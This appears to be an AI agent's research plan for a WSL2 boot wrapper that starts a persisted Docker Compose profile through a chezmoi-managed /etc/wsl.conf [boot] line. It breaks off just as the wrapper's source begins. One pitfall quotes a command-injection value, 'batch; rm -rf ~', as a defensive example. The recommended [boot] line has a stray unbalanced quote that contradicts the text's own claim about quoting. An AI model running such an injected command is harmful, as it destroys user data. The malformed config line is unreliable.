# Phase 3: Boot Autostart - Research

**Researched:** 2026-09-17
**Domain:** WSL2 boot-time autostart (no systemd) driving a Docker Compose profile selector
**Confidence:** HIGH

<user_constraints>
## User Constraints (from CONTEXT.md)

### Locked Decisions
- **D-01:** Separate boot wrapper at `/usr/local/bin/local-llm-start` — vendor/model-agnostic name per user choice. Do NOT append a qwen block into `/usr/local/bin/paseo-boot-start`: the chezmoi template rewrites that file unconditionally on every apply and would clobber it.
- **D-02:** `/etc/wsl.conf [boot]` chains both wrappers (paseo + local-llm-start) in a single boot command, each failing independently without blocking the other.
- **D-03:** The chezmoi template owns both wrappers — `chezmoi apply` is the BOOT-03 installer. There is NO repo-root installer script. — **Reversibility:** costly — undo moves boot-hook ownership back into the repo and splits it from the dotfiles repo's boot management.
- **D-04:** `local-llm-start` reads `.current-profile` at the repo root and runs `docker compose --profile <persisted> up -d` for exactly that profile.
- **D-05:** Run the compose stack as the login user via `su -l pengwin` (mirroring `paseo-boot-start`), not as root — same PATH/env as interactive use so `docker` and `compose` resolve identically.
- **D-06:** Skip the VRAM-release gate at boot — a fresh boot means VRAM is free; the 60×2s poll is a switch-time concern only.
- **D-07:** Fire-and-forget `up -d` at boot; do NOT block on `/health` (the Compose healthcheck owns that with its 900s start period, and `restart: unless-stopped` covers crashes).
- **D-08:** The locked default is `batch` — matching current `switch.sh:109` behavior after quick task 260917-2fz. This deliberately overrides the stale `single` wording in ROADMAP/REQUIREMENTS/PROJECT.md. — **Reversibility:** reversible — one-token fallback, trivial to flip.
- **D-09:** Tolerant fallback at boot, same as `switch.sh`: missing, blank, whitespace-only, or corrupt `.current-profile` all resolve to the default (`batch`).
- **D-10:** The plan MUST include aligning the planning docs to `batch`: BOOT-02 wording, ROADMAP Phase 3 success criterion 3, and PROJECT.md Key Decisions (default-profile row).
- **D-11:** BOOT-03 idempotency is proven via the template's already-set check: re-running `chezmoi apply` prints the `already set — no change` path and touches nothing (same convention as the paseo template).
- **D-12:** Verify BOOT-01 with a REAL `wsl --shutdown` + reopen cycle (not a dry run) — slow (model load + JIT) but conclusive.
- **D-13:** The boot wrapper logs what it did (timestamp, profile chosen, compose result) to a file so the post-reboot check has evidence.

### the agent's Discretion
- Exact `wsl.conf` chaining syntax (`&&` vs `;` with `|| true` guards), exact log file path, repo-path resolution in the wrapper (fixed path vs discovery), `stop_grace_period`/ordering relative to the Docker-daemon start lines, and the exact doc-wording edits for D-10.

### Deferred Ideas (OUT OF SCOPE)
- None — discussion stayed within phase scope.
</user_constraints>

<phase_requirements>
## Phase Requirements

| ID | Description (from REQUIREMENTS.md) | Research Support |
|----|------------------------------------|------------------|
| BOOT-01 | A WSL boot hook (following the existing `/etc/wsl.conf [boot]` chezmoi wrapper convention, not systemd) starts the last-persisted profile after `wsl --shutdown` + restart | §Architecture Patterns (combined `[boot]` line, self-healing templates); §Code Examples (wrapper + 045 template skeleton); Microsoft source confirms `[boot]` is `/bin/sh -c` as a child of init (PID 1) — §State of the Art |
| BOOT-02 | If no profile was ever selected, the boot hook starts the default profile — **wording in REQUIREMENTS.md:24 still says `single`; D-08 locks `batch` — this line is a D-10 alignment target** | §Code Examples (D-10 edits); `switch.sh:96-111` tolerant read is the canonical fallback to mirror |
| BOOT-03 | Boot hook installation is idempotent (safe to re-run, matches the existing paseo-boot-start wrapper pattern) | §Architecture Patterns (idempotency invariants for the combined line); paseo template `grep -qF` + `sed` convention at lines 60/66/86 |
</phase_requirements>

## Summary

Phase 3 adds a second, independent boot wrapper (`/usr/local/bin/local-llm-start`) that, at WSL2 VM start, reads the `.current-profile` state file written by `switch.sh` and brings up exactly that Compose profile (`docker compose --profile <persisted> up -d`), falling back to `batch` when the state file is missing/blank/corrupt (D-08/D-09). It is chained onto the existing `/etc/wsl.conf [boot]` line alongside `/usr/local/bin/paseo-boot-start` (D-02) and installed/owned entirely by a new chezmoi template in the dotfiles repo (D-03) — no installer script in this repo.

The one genuinely open technical question going into this research — **does WSL2 pass the `[boot] command` value to a shell or straight to `execvp`?** — is now **resolved from the official Microsoft source**: `microsoft/WSL` (`master` branch) `src/linux/init/config.cpp:997-1014` shows the value is executed via `execl("/bin/sh", "sh", "-c", Command.c_str(), nullptr)` in a `fork()`-ed child of the WSL init process (PID 1), running as root. The entire `[boot]` value is one shell command string, so `;`-chaining two wrappers is not just acceptable but the *correct* form of D-02's "each failing independently without blocking the other" requirement (`;` continues on failure; `&&` would not). This also means the chain can use any POSIX-sh syntax. The same pattern is used for `[oobe]` (`init.cpp:639`), and the boot block is unconditional with respect to the `[boot] systemd` flag (this machine has no systemd, so the non-systemd path is the one that runs).

Consequently the phase is a **two-repo, three-part** change: (1) a new `run_onchange_after_045-wsl-boot-llm.sh.tmpl` in the dotfiles repo that writes the new wrapper and manages the *combined* `[boot]` line in a self-healing way that coexists with the existing paseo template (which stays byte-identical), (2) D-10 documentation alignment in this repo (3 named targets), and (3) a human-only verification step: real `chezmoi apply` (sudo not available to the agent non-interactively) + `wsl --shutdown` + reopen + log check (D-12). No new external packages are installed anywhere.

**Primary recommendation:** Keep the combined `[boot]` line in the exact form `command = "/usr/local/bin/paseo-boot-start" ; /usr/local/bin/local-llm-start"` (paseo prefix first — it is the existing paseo template's idempotency anchor), let the new 045 template own the combined line's construction, and let both templates' existing `grep -qF` markers make them mutually no-ops once converged.

## Architectural Responsibility Map

| Capability | Primary Tier | Secondary Tier | Rationale |
|------------|-------------|----------------|-----------|
| Windows logon → WSL2 VM start | Windows (scheduled task `chezmoi-wsl2-autostart`) | — | Already in place (`wsl.exe --exec true` at logon); untouched by this phase |
| `[boot]` command interpretation | WSL kernel/init (Microsoft `/init`, PID 1) | — | `sh -c` of the full value, as root — kernel-level, not modifiable by us |
| Docker daemon availability at boot | WSL userland (via `paseo-boot-start`'s `service docker` line) | Docker daemon itself | The existing paseo wrapper already starts the daemon; the LLM wrapper must *wait for readiness*, not start it |
| Profile selection at boot | New `/usr/local/bin/local-llm-start` wrapper (root → `su -l pengwin`) | — | Reads `.current-profile`, whitelists, calls compose |
| Container lifecycle (start/crash/health) | Docker daemon (`restart: unless-stopped` + compose healthcheck) | — | D-07: boot is fire-and-forget; the healthcheck's 900s start period owns "healthy" |
| Persisted state (which profile) | Repo file `~/repos/qwen38-27b-rtx3090/.current-profile` (gitignored) | — | Written by `switch.sh:197` only after successful `up -d`; read-only for the boot hook |
| Install / idempotency / cleanup | dotfiles repo chezmoi template `run_onchange_after_045-wsl-boot-llm.sh.tmpl` | existing `run_onchange_after_04-wsl-boot-paseo.sh.tmpl` | `chezmoi apply` is the installer (D-03); both templates share the same gate and clean up together |
| Doc alignment (D-10) | This repo's `.planning/` planning docs + `switch.sh` header comment | — | Text-only, no runtime effect |

## Project Constraints (from AGENTS.md / CLAUDE.md)

The qwen repo has **no** `AGENTS.md`; its project constraints live in `.claude/CLAUDE.md` (GSD-generated from PROJECT.md + codebase docs). The dotfiles repo (where the new template lives) has an authoritative `AGENTS.md`. Binding directives the planner must honor:

**From `~/.local/share/chezmoi/AGENTS.md` (dotfiles repo — governs the new template file):**
- MUST run `chezmoi apply --dry-run --verbose` before marking any plan complete that touches dotfile templates/scripts (line 3, lines 13–19).
- Pre-commit validation (lines 134–167): run `mise run format`, `mise run lint`, `mise run benchmark`, and `chezmoi apply --dry-run --verbose` before staging/committing; `commit-msg` and `pre-commit` lefthook hooks are auto-installed via `.mise.toml` (verified present: `lefthook.yml` + `.mise.toml` in the dotfiles repo root, `pre-commit`/`commit-msg` hooks in `.git/hooks/`).
- BCP 14 keywords MUST be uppercase when normative in policy docs (line 99).
- No bare `op://` in template comments (line 114).
- PR bodies MUST be detailed (line 180).

**From `./claude/CLAUDE.md` (qwen repo):**
- GSD workflow enforcement (lines 277–288): repo edits happen through GSD commands; no direct repo edits outside the GSD workflow.
- Platform constraints: no systemd as PID 1 (boot automation MUST use `/etc/wsl.conf [boot]`); one GPU → one profile at a time; sandbox sudo is scoped (non-interactive sudo limited to `service docker {start,stop,restart,status}` and a few WSL helper scripts — a *real* `chezmoi apply` in the dotfiles repo needs passwordful sudo and is a human checkpoint).
- The qwen repo has no formatter/linter config (`.claude/CLAUDE.md` Conventions: "No formatter config found… no linter config present") — the GSD commit flow (`gsd-tools query commit`) is its only gate.

## Standard Stack

> **No new external packages are installed by this phase.** All components already exist on this machine. The "stack" is the WSL2 boot mechanism plus existing userland tools.

### Core
| Component | Version (verified this session) | Purpose | Why Standard |
|-----------|--------------------------------|---------|--------------|
| WSL2 `/init` (Microsoft) | kernel `6.18.33.2-microsoft-standard-WSL2`; `/init` = 2,836,528-byte ELF `[VERIFIED: uname -r; ls -la /init]` | PID 1; executes `[boot] command` via `fork()` + `execl("/bin/sh","sh","-c",…)` | The only boot hook available without systemd — locked by PROJECT.md constraint and D-03 |
| `/bin/sh` → dash | dash (symlink verified: `/bin/sh -> dash`) `[VERIFIED: ls -la /bin/sh]` | The shell that interprets the `[boot]` value | POSIX `;` semantics are exactly what D-02 needs |
| Docker | client 29.8.0 / daemon 29.8.0 `[VERIFIED: docker version]` | Container runtime + `restart: unless-stopped` | Existing deploy vehicle (PROJECT.md) |
| Docker Compose | v5.5.1 `[VERIFIED: docker compose version]` | `--profile single|batch up -d` | Existing profile mechanism (docker-compose.yml:71-79) |
| `su` (util-linux) | present `[VERIFIED: in use by live paseo-boot-start]` | root → login-user handoff with full login env (D-05) | Proven in production by the paseo wrapper (22h+ uptime) |

### Supporting
| Component | Version | Purpose | When to Use |
|-----------|---------|---------|-------------|
| chezmoi | v2.72.2 `[VERIFIED: chezmoi version]` | Renders/owns the new 045 template → `/usr/local/bin/local-llm-start` + `[boot]` line | The installer (D-03); `--dry-run` for the agent, real apply for the human |
| bash | 5.2.37 `[VERIFIED: bash --version]` | Wrapper implementation language (matches `paseo-boot-start`'s `#!/bin/bash`) | Wrapper body |
| `nvidia-smi` | driver 616.92, via `/usr/lib/wsl/lib` (WSL's GPU lib dir, not on default PATH) `[VERIFIED: nvidia-smi via PATH fixup]` | Optional boot-time evidence logging (VRAM state) | Only if the wrapper logs GPU state — not required by D-01..D-13 |

### Alternatives Considered
| Instead of | Could Use | Tradeoff |
|------------|-----------|----------|
| `/etc/wsl.conf [boot]` chain | systemd + `systemctl enable` | Rejected: no systemd as PID 1 on this distro (PROJECT.md constraint; `ps -p 1` = `init(WLinux)` `[VERIFIED: ps -p 1]`) |
| `[boot]` chain | `@reboot` cron job | No cron daemon runs without an init system; `[boot]` is the only WSL pre-session hook |
| `[boot]` chain | Windows Task Scheduler running a compose command directly | Bypasses the established wrapper convention (D-03), duplicates env setup, and couples the Windows tier to docker specifics — the existing `chezmoi-wsl2-autostart` logon task already boots the VM; the rest belongs in `[boot]` |
| `su -l pengwin` (D-05) | `docker exec` as root, or `runuser` | `su -l` is the proven convention here (paseo); `runuser` would skip the login shell the mise-activated PATH depends on |

**Installation:** none — no packages installed.

## Package Legitimacy Audit

> **Not applicable — this phase installs zero external packages** (verified: the only binaries touched are `/usr/local/bin/local-llm-start` (new, owned by the dotfiles repo template) and existing system tools). No `npm view`/`pip index`/`cargo search` gate is required. No packages removed, none flagged.

## Architecture Patterns

### System Architecture Diagram

```
 Windows host (logon)
   │  Scheduled task "chezmoi-wsl2-autostart" (logon trigger; wsl.exe --exec true)
   │  .wslconfig: vmIdleTimeout=-1, instanceIdleTimeout=-1, networkingMode=mirrored
   ▼
 WSL2 VM start
   │
   │  /init (PID 1, "init(WLinux)", Microsoft binary)
   │   ├─ reads /etc/wsl.conf
   │   └─ [boot] command present?
   │         │  fork() child → execl("/bin/sh","sh","-c", <value>, NULL)   [as root]
   │         ▼
   │   /bin/sh -c  '"/usr/local/bin/paseo-boot-start" ; /usr/local/bin/local-llm-start"'
   │         │
   │         ├────────────────────────┬─────────────────────────────┐
   │         ▼                        ▼                             │
   │   paseo-boot-start        local-llm-start (NEW)               │ (D-02: ";" = independent
   │   (existing)              (new, this phase)                   │  failure isolation)
   │   ├─ service docker       ├─ poll docker socket ready (NEW)   │
   │   │   status||start       │   (up to ~120s)                   │
   │   └─ exec su -l pengwin   ├─ su -l pengwin:                   │
   │        → paseo daemon          ├─ read .current-profile        │
   │        (self-daemonizes)       │   (tolerant read → batch)     │
   │                                ├─ whitelist single|batch       │
   │                                └─ docker compose              │
   │                                    --profile X up -d          │
   │                                    (fire-and-forget, D-07)    │
   │                                └─ log to /var/log/
   │                                    local-llm-boot.log (D-13)  │
   ▼                                                              ▼
 Docker daemon  ──►  containers (restart: unless-stopped; healthcheck /health,
   │                  interval 30s, start_period 900s)
   ▼
 "Up" immediately; "healthy" after model load + JIT (≤ ~15 min)
```

Key property: the `[boot]` child is fire-and-forget from init's perspective (init does not `wait()`; empirically the paseo daemon runs for 22h+ as PPID 1). The chain's total wall time is bounded by the docker-readiness poll, not by container health.

### Component Responsibilities (file → owner → repo)

| File | Role | Owned by | Repo |
|------|------|----------|------|
| `.chezmoiscripts/run_onchange_after_04-wsl-boot-paseo.sh.tmpl` (107 lines, unchanged) | Writes `paseo-boot-start`; patches `[boot]` line only when its `grep -qF` anchor is absent; cleanup branch when gate fails | existing | dotfiles (`~/.local/share/chezmoi`) |
| `.chezmoiscripts/run_onchange_after_045-wsl-boot-llm.sh.tmpl` (NEW) | Writes `local-llm-start`; constructs/repairs the **combined** `[boot]` line; mirrors the paseo gate + cleanup branch | this phase | dotfiles |
| `/usr/local/bin/local-llm-start` (NEW, ~50 lines bash) | The boot hook: docker-ready wait → `su -l pengwin` → tolerant read → whitelist → `compose --profile X up -d` → log | 045 template (rewritten unconditionally, content stable — same convention as the paseo wrapper) | rendered artifact |
| `/etc/wsl.conf` lines 16–17 (MODIFIED) | `[boot]` / `command = "/usr/local/bin/paseo-boot-start" ; /usr/local/bin/local-llm-start"` | both templates (invariant below) | live system |
| `switch.sh` (MODIFIED: header comment only, D-10-adjacent) | State-file writer (line 197: `printf '%s\n' "$TARGET" > "$STATE_FILE"` after `up -d`) | this phase | qwen (this repo) |
| `docker-compose.yml` (unchanged) | profiles `single`/`batch`, `restart: unless-stopped` (line 57), `stop_grace_period: 30s` (line 58), healthcheck `start_period: 900s` (line 64) | existing | qwen |
| `.current-profile` (unchanged, gitignored line 12) | Persisted profile token; current value `batch` `[VERIFIED: .current-profile:1]` | `switch.sh` | qwen |
| `.planning/REQUIREMENTS.md`, `.planning/ROADMAP.md`, `.planning/PROJECT.md` (MODIFIED, D-10) | Doc alignment to `batch` | this phase | qwen |

### Pattern 1: The combined `[boot]` line — mutual idempotency invariant

**What:** One `[boot]` line carries both wrappers:
```
command = "/usr/local/bin/paseo-boot-start" ; /usr/local/bin/local-llm-start"
```
**Invariant (load-bearing):** the line MUST begin with the exact substring
`command = "/usr/local/bin/paseo-boot-start"` — that is the existing paseo template's idempotency anchor (`grep -qF "$BOOT_LINE"` at template line 60, with `BOOT_LINE="command = \"${WRAPPER}\""` at line 6 — a double-quoted variable form that expands at runtime to `command = "/usr/local/bin/paseo-boot-start"` (`WRAPPER` set at line 5) `[VERIFIED: run_onchange_after_04-wsl-boot-paseo.sh.tmpl:6,60]`). As long as the combined line keeps that prefix, the paseo template sees "already set — no change" and never runs its whole-line-replacement `sed` (line 66: `sudo sed -i "s|^command\s*=.*|${BOOT_LINE}|" /etc/wsl.conf`), which would otherwise *delete* the LLM half of the chain.

**Self-healing in both apply orders (045 template logic):**
1. `[boot]` line contains the LLM marker (`/usr/local/bin/local-llm-start`) → no-op (`already set — no change`).
2. line contains the paseo marker but not the LLM marker → replace the line with the full combined line (this is the normal first-run path after the paseo template has already written its line).
3. line contains neither (or `[boot]`/`command` absent) → write the full combined line (paseo first).
4. line contains an *unknown* third command → leave untouched, log a warning to stdout (do not adopt foreign lines).

Cleanup branch (gate fails: not WSL, or work profile, or no NVIDIA GPU — identical gate to paseo): delete the whole `[boot]` line (both markers go with it, since they share one line) and remove `/usr/local/bin/local-llm-start` — mirrors paseo lines 79–88 exactly. Because both templates share the *same* gate (`and (eq .chezmoi.os "linux") .is_wsl` outer; `and (eq .profile "personal") .has_nvidia_gpu` inner — `[VERIFIED: .chezmoi.toml.tmpl:193-199]` for `is_wsl`/`profile`/`has_nvidia_gpu`), both cleanup branches always fire or never fire together; teardown is consistent in any order.

**Why the 045 slot:** `run_onchange_after_05-install-mise-tools.*` already exists in `.chezmoiscripts/` `[VERIFIED: directory listing]`. ASCII sort places `045` between `04-` (`'-'`=0x2D < `'5'`=0x35) and `05` (`'4'` < `'5'`), so the new template runs *after* the paseo template and *before* mise tooling — deterministic reasoning about who wrote the line first, with self-healing making order non-critical anyway.

### Pattern 2: Tolerant state read (D-09) — mirror of switch.sh:96-111 verbatim

**What:** The boot wrapper copies `switch.sh`'s read predicate word-for-word so "corrupt" means the same thing in both places:
```bash
SAVED=
if [ -f "$STATE_FILE" ]; then
  SAVED=$(cat "$STATE_FILE" 2>/dev/null || true)
fi
SAVED="${SAVED#"${SAVED%%[![:space:]]*}"}"   # strip leading whitespace
SAVED="${SAVED%"${SAVED##*[![:space:]]}"}"   # strip trailing whitespace
case "$SAVED" in
  single|batch) PROFILE=$SAVED ;;
  *)            PROFILE=batch ;;
esac
```
`[VERIFIED: switch.sh:101-110]` (note: line 109's live default is `TARGET=batch` post quick-task 260917-2fz, while the *header comment* at line 12 still says `-> single` — stale, see D-10/Open Questions).

**Why verbatim:** D-09 says "same as switch.sh"; a drifted predicate (e.g. trimming only spaces, not tabs; or a different default) would let `switch.sh` and the boot hook disagree about what "corrupt" means.

### Pattern 3: root → login-user handoff (D-05)

**What:** `exec su -l pengwin -c '…'` inside the wrapper, mirroring `paseo-boot-start:12-29` `[VERIFIED: /usr/local/bin/paseo-boot-start:12-29]` — including the `mise activate` prelude, so `docker`/`docker compose` resolve from the same PATH as interactive use.
**Why:** the `[boot]` child is root with a minimal env (`env_reset` in sudoers `[VERIFIED: sudo -n -l]`); `su -l` re-sources the login profile and yields a real session. The compose invocation itself runs as `pengwin`, so container ownership and the existing `docker` group membership apply exactly as during interactive switches.

### Pattern 4: Fire-and-forget with healthcheck ownership (D-07)

**What:** The wrapper's last action is `docker compose --profile "$PROFILE" up -d` (non-blocking). The compose healthcheck (`start_period: 900s` `[VERIFIED: docker-compose.yml:59-64]`) owns the "healthy" transition; `restart: unless-stopped` (line 57) covers crashes.
**Why:** a 900s block at boot would stall every other boot activity for up to 15 minutes (torch.compile + CUDA graphs + FlashInfer JIT on first start) and still add no safety — the healthcheck already restarts/retries.

### Anti-Patterns to Avoid
- **Appending a qwen block inside `paseo-boot-start`** — D-01's explicit rejection; the paseo template rewrites that file unconditionally on every apply and would clobber it (template line 26 `sudo tee "$WRAPPER"`, no idempotency guard on the file itself).
- **`&&` chaining in `[boot]`** — if `paseo-boot-start` exits non-zero, the LLM hook would never run. D-02 requires independent failure → `;`.
- **A second `command =` line inside `[boot]`** — the 045 template must *replace* the existing line (or the whole `[boot]` section), never append a second key; duplicate keys are undefined territory in WSL's config parser.
- **A repo-root installer script** — D-03: `chezmoi apply` is the installer; a second installation path creates a drift vector between the two owners.
- **Blocking on `/health` at boot** — see Pattern 4; it converts a 15-minute healthy window into a 15-minute boot stall.
- **Interpolating the raw `.current-profile` value into a shell command without the whitelist case** — command-injection surface (see Security Domain); the whitelist is not optional decoration.
- **Assuming the docker socket is ready immediately** — the paseo wrapper's `service docker start` is fire-and-forget (lines 8–10 `[VERIFIED: /usr/local/bin/paseo-boot-start:8-10]`); the LLM wrapper must poll before `compose`.

## Don't Hand-Roll

| Problem | Don't Build | Use Instead | Why |
|---------|-------------|-------------|-----|
| Idempotent `wsl.conf` patching | A new ini/`[boot]` parser (python/toml/awk) | The existing `grep -qF` + 3-branch `sed` convention already proven by the paseo template (lines 60–74) | It encodes the exact edge cases (no `[boot]`, `[boot]` without `command`, existing `command`) and is byte-stable under re-runs |
| Login-environment replication for the compose user | A hand-built `env`/`PATH` export block in the wrapper | `su -l pengwin` (paseo convention, lines 12–17) | PAM + profile sourcing is the source of truth; a hand-built env drifts from interactive use every time a profile script changes |
| Process supervision / crash recovery | A `while true` respawn loop in the wrapper | Docker's `restart: unless-stopped` + the compose healthcheck | The daemon is the supervisor; a shell loop would double-supervise and hide the real failure mode |
| VRAM-free check at boot | Re-using `switch.sh`'s 60×2s gate | Nothing (D-06) | A fresh VM start means nothing else is holding the GPU; the gate exists for switch-time contention only |
| Secret/env injection into the container at boot | Parsing `.env` in the wrapper | `env_file: .env` in docker-compose.yml (line 34–36, `required: false`) | The compose file already reads the same file interactive switches use — one code path |

**Key insight:** every hard part of this phase (boot hook existence, idempotency, env parity, supervision) is already solved by an existing, proven mechanism on this machine. The phase's actual surface area is one small wrapper, one template, and three doc lines — plus the human-only reboot verification.

## Runtime State Inventory

> This phase modifies live system state (a `/etc` file, a new `/usr/local/bin` binary, and docs naming a default). Audit of every state class:

| Category | Items Found | Action Required |
|----------|-------------|------------------|
| Stored data | `.current-profile` = `batch` (repo root, gitignored) `[VERIFIED: .current-profile:1, .gitignore:12]` | **None (read-only).** No data migration — the token format (single line, `single`/`batch`) is unchanged and already matches the new default |
| Live service config | (1) `/etc/wsl.conf:17` `command = "/usr/local/bin/paseo-boot-start"` `[VERIFIED: /etc/wsl.conf:16-17]`; (2) Windows scheduled task `chezmoi-wsl2-autostart` (logon → `wsl.exe --exec true`) `[VERIFIED: run_onchange_after_04-start-wsl2-on-boot.ps1.tmpl:9,24]` — its comment (lines 13–15) names the paseo template as the `[boot]` manager; (3) Docker daemon restart-policy state in `/var/lib/docker` (batch container currently `Up 14 hours (healthy)` on :18020 `[VERIFIED: docker ps]`) | (1) Code edit by the 045 template (combined line). (2) **No change** — the task is unaffected; optionally extend its comment to name both templates (nice-to-have, see Open Questions). (3) **None** — `restart: unless-stopped` self-manages across daemon restarts |
| OS-registered state | None new: no systemd units (distro has no systemd as PID 1 `[VERIFIED: ps -p 1 → init(WLinux)]`), no new cron entries, no new PAM files. The PAM nofile pin `/etc/security/limits.d/99-docker-nofile.conf` (`pengwin hard nofile 524288` `[VERIFIED: file content]`) is *required by* the existing `service docker start` line (it pins the value `/etc/init.d/docker:62` `ulimit -Hn 524288` expects `[VERIFIED: /etc/init.d/docker:62,67,69]`) — the new wrapper depends on it transitively but must not touch it | **None** — dependency only; documented so a future "cleanup" doesn't delete the pin and break `service docker start` at boot |
| Secrets / env vars | `.env` at repo root (gitignored; `VLLM_API_KEY` et al.) consumed by `docker-compose.yml:34-36` `env_file` at `up` time; PAM `secure_path`/`env_keep` in sudoers `[VERIFIED: sudo -n -l]` | **None** — the boot path uses the identical `.env` as interactive switches; no key renames, no new env vars |
| Build artifacts / installed packages | (1) dotfiles repo: rendered chezmoi output for the new template (`/usr/local/bin/local-llm-start` is the new deployed artifact); (2) dotfiles repo working tree currently has unrelated local edits (`M apm.yml`, `?? .mcp.json`, `?? opencode.json` `[VERIFIED: git status]`) | (1) Created automatically by `chezmoi apply`; re-created on every apply (idempotent content). (2) The agent must stage **only** the new template file in the dotfiles repo; the pre-existing local edits stay untouched (see Open Questions) |

**Nothing found in a category:** OS-registered state has no *new* registrations (stated explicitly above).

## Common Pitfalls

### Pitfall 1: The paseo template's whole-line `sed` clobbers the chain
**What goes wrong:** the LLM half of the `[boot]` line disappears after a later `chezmoi apply` — the paseo daemon keeps booting, but the model stack no longer auto-starts (silent: no error anywhere, just a cold GPU).
**Why it happens:** the paseo template patches with `s|^command\s*=.*|${BOOT_LINE}|` (line 66), which replaces the *entire* line. That branch only runs when its `grep -qF` anchor is absent — so the clobber happens if the combined line ever loses its paseo *prefix* (wrong ordering, manual edit, a divergent 045 patch).
**How to avoid:** enforce the prefix-first invariant (Pattern 1); the 045 template always writes the paseo segment first; a 045 self-check greps for both markers after patching.
**Warning signs:** `grep -c 'local-llm-start' /etc/wsl.conf` = 0 while the paseo marker is present, after any apply.

### Pitfall 2: Config changes don't take effect until the VM fully stops
**What goes wrong:** the human runs `chezmoi apply`, sees the new `[boot]` line in `/etc/wsl.conf`, reopens a WSL terminal, and the new hook "doesn't work" — because the running VM already parsed the old config at boot.
**Why it happens:** WSL's documented "8 second rule": config is read only at VM start; closing all shells doesn't stop the VM (~8 s grace) `[CITED: learn.microsoft.com/en-us/windows/wsl/wsl-config — "The 8 second rule for configuration changes"]`.
**How to avoid:** the apply step MUST be followed by `wsl --shutdown` (D-12's real-reboot requirement); the verification checklist should state "changes only apply to a VM that has not yet started".
**Warning signs:** `/etc/wsl.conf` and boot behavior disagree; `wsl --list --running` still shows the distro after closing all terminals.

### Pitfall 3: Docker socket not ready when the LLM wrapper runs
**What goes wrong:** `docker compose up -d` fails with "Cannot connect to the Docker daemon" and the boot hook exits; on a bad day nothing retries and the GPU sits idle.
**Why it happens:** the paseo wrapper's `service docker start` (lines 8–10) returns when the init script finishes, not when `dockerd` has created `/var/run/docker.sock` and is accepting. Paseo doesn't care (it's not a docker client); this wrapper does.
**How to avoid:** a readiness poll before the compose call: `for i in $(seq 1 60); do docker info >/dev/null 2>&1 && break; sleep 2; done` (≤120 s), then a hard log-and-exit if still down.
**Warning signs:** first boot log line "docker daemon not ready after 120s"; `docker compose` failures in the boot log.

### Pitfall 4: Expecting "healthy" immediately after boot
**What goes wrong:** the verifier declares BOOT-01 failed because `docker ps` shows `Up` but not `(healthy)` a few minutes after the reboot.
**Why it happens:** the healthcheck's `start_period: 900s` (docker-compose.yml:64) means the container is legitimately "starting" for up to 15 minutes (torch.compile + CUDA graphs + FlashInfer JIT on first start).
**How to avoid:** D-12's verification criteria = (a) wrapper log line shows `up -d` succeeded for the persisted profile, (b) container `Up`, (c) *eventually* healthy within the start period — never an immediate-healthy check.
**Warning signs:** `docker inspect --format '{{.State.Health.Status}}'` = `starting` for >15 min (that *would* be a real failure — weight/JIT issue, not a boot-hook issue).

### Pitfall 5: `[boot]` only fires on a true VM start
**What goes wrong:** "verification" done by closing/reopening a terminal shows nothing — and the team misreads it as the hook being broken.
**Why it happens:** WSL2 keeps the VM alive after the last shell closes (8 s grace, and indefinitely here because `vmIdleTimeout=-1`/`instanceIdleTimeout=-1` `[VERIFIED: /mnt/c/Users/ben/.wslconfig]`); only a full VM stop (Windows shutdown/reboot, or `wsl --shutdown`) re-runs `[boot]`.
**How to avoid:** D-12 already locks this: verification uses a REAL `wsl --shutdown` + reopen. The plan should also warn that a terminal close/reopen is a no-op by design (containers keep running — which is the desired day-to-day behavior).
**Warning signs:** "I tested it by closing my terminal and the model didn't restart" — expected, not a bug.

### Pitfall 6: Corrupt or malicious `.current-profile` reaching the shell
**What goes wrong:** a tampered/accidentally-corrupt state file (e.g. `batch; rm -rf ~`) is interpolated into a shell command and executes.
**Why it happens:** the state file is world-readable, sits in a user repo, and is read at boot by a *root* process.
**How to avoid:** the whitelist `case` (Pattern 2) is the control — only the literal tokens `single|batch` are ever used, and the value is never interpolated unvalidated (ASVS V5; see Security Domain).
**Warning signs:** none at runtime — this is a design invariant, checked by code review of the wrapper.

### Pitfall 7: No TTY at boot — interactive prompts and output loss
**What goes wrong:** anything in the `su -l` chain that prompts (a mise hook asking a question, a first-run wizard) hangs the boot child forever or writes to a dead stdout.
**Why it happens:** the `[boot]` child has no controlling terminal; all stdout/stderr go nowhere visible.
**How to avoid:** the wrapper's own actions are non-interactive by construction (no prompts in the compose path — proven by the identical interactive switch path); D-13's log file is the only evidence channel; the paseo wrapper's 22h+ unattended operation shows the existing login-shell chain is already prompt-free in this environment.
**Warning signs:** boot child process stuck (`ps -ef | grep local-llm-start` still alive minutes after boot) — treat as a hang, investigate the log.

### Pitfall 8: Two-repo commit confusion
**What goes wrong:** the dotfiles repo's lefthook pre-commit (format/lint/benchmark + conventional commit-msg) rejects the agent's commit, or the agent accidentally commits the repo's pre-existing unrelated local edits (`apm.yml`, `.mcp.json`, `opencode.json`).
**Why it happens:** the phase's artifacts live in *two* git repos with different gate regimes (qwen repo: no hooks, GSD commit; dotfiles repo: lefthook + mise).
**How to avoid:** plan task ordering: (a) qwen-repo doc edits via GSD commit; (b) dotfiles-repo template with `mise run format && mise run lint && mise run benchmark && chezmoi apply --dry-run --verbose` (AGENTS.md pre-commit list) and `git add` of *only* the new template file; (c) human real-apply checkpoint.
**Warning signs:** hook failure output naming `lefthook`/`mise`; `git status` in the dotfiles repo showing staged files other than the template.

### Pitfall 9: The "already running" ambiguity after boot
**What goes wrong:** the boot log can't distinguish "the wrapper started the container" from "the docker daemon's `unless-stopped` policy auto-restarted it on daemon start and the wrapper's `up -d` was a no-op".
**Why it happens:** on a fresh VM start, `dockerd` itself restarts any container that was running (not explicitly stopped) before the last daemon stop — *before* the `[boot]` chain's compose call runs. Both paths converge on the same desired state (persisted profile up), so this is a *logging* gap, not a behavioral bug.
**How to avoid:** the wrapper records container state *before* `up -d` (e.g. `docker compose ps -q <profile>` → "already running" vs "starting") in its log line, so post-reboot forensics know which path fired.
**Warning signs:** none — purely diagnostic.

## Code Examples

Verified patterns from this machine's live files and the official WSL source.

### The `[boot]` target line (D-02)

```ini
# /etc/wsl.conf (target state after the 045 template runs)
[boot]
command = "/usr/local/bin/paseo-boot-start" ; /usr/local/bin/local-llm-start"
```

Mechanics: WSL executes this as `execl("/bin/sh", "sh", "-c", "…the whole value…", NULL)`
`[VERIFIED: microsoft/WSL @ master, src/linux/init/config.cpp:1012 — verbatim: execl("/bin/sh", "sh", "-c", Command.c_str(), nullptr);]`.
`/bin/sh` is dash on this distro `[VERIFIED: ls -la /bin/sh → dash]`; `a ; b` runs both, `b` regardless of `a`'s exit status. The value is a single string — the `;` is *inside* the quotes, parsed by the shell, not by WSL's config parser.

### The new wrapper: `/usr/local/bin/local-llm-start` (D-01, D-04, D-05, D-06, D-07, D-09, D-13)

```bash
